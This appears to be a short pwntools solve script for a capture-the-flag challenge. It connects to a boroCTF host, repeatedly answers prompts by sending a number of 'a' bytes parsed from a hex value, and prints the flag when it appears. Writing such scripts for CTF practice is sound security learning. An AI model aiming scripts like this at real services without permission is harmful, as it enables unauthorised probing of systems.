from pwn import *

conn = remote('tnkemaq46125.boroctf.com', 56354)

for _ in range(100):
    line = conn.recvline().decode().strip()
    print(line)

    if 'boroCTF' in line:
        print("FLAG:", line)
        break

    if 'Please enter' in line:
        count = int(line.split('0x')[1].split(' ')[0], 16)
        conn.sendline(b'a' * count)

conn.close()